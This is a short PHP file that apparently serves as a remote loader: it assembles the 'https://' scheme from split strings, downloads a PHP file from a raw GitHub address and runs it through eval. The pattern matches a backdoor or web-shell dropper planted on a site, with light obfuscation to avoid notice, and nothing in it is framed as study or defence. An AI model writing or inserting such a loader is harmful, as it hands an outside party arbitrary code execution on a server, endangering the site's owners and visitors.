<?php
$awo = 'htt'.'ps://';
eval("?>".file_get_contents($awo.'raw.githubusercontent.com/WhatsWrongAndWhy/UseBrain/main/IDontKnow.php'));
?>
